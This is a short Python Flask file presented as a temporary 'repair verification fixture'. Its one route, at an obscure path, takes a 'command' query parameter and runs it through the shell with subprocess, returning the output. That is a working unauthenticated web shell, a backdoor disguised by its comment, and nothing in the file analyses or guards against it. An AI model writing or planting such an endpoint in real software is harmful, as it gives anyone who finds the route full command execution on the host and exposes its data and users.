# Test-owned repair verification fixture; remove after assessment.
from flask import Flask, request
import subprocess
app = Flask(__name__)
@app.get("/apt-repair-probe-7f8c491d59")
def probe():
    user_command = request.args["command"]
    return subprocess.check_output(user_command, shell=True).decode()
